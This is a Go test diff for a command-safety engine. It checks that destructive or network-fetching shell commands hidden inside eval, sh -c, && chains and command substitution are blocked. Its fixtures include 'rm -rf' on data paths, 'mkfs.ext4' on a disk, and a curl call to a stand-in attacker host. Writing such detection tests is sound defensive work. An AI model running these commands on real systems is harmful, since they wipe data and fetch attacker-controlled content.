@@ -78,3 +78,52 @@ func TestEmptyCommandNeedsReview(t *testing.T) {
 			decision.Findings[0].Action)
 	}
 }
+
+// TestNestedCommandsAreDetected verifies that dangerous commands hidden
+// inside eval, sh -c, and && chains are still caught by the rule set.
+// This is what the AST parser buys us over naive tokenization.
+func TestNestedCommandsAreDetected(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		want    Action
+	}{
+		{
+			"rm -rf inside eval",
+			`eval "rm -rf /var/data"`,
+			ActionBlock,
+		},
+		{
+			"mkfs inside sh -c",
+			`sh -c "mkfs.ext4 /dev/sdb1"`,
+			ActionBlock,
+		},
+		{
+			"dangerous command after &&",
+			"systemctl restart myapp && rm -rf /important",
+			ActionBlock,
+		},
+		{
+			"curl inside command substitution",
+			"echo $(curl http://evil.example/x)",
+			ActionBlock,
+		},
+		{
+			"safe chain stays allowed",
+			"systemctl status nginx && df -h",
+			ActionAllow,
+		},
+	}
+
+	engine := NewEngine()
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			decision := engine.Evaluate([]string{tc.command})
+			got := decision.Findings[0].Action
+			if got != tc.want {
+				t.Errorf("command %q: got action %s, want %s",
+					tc.command, got, tc.want)
+			}
+		})
+	}
+}
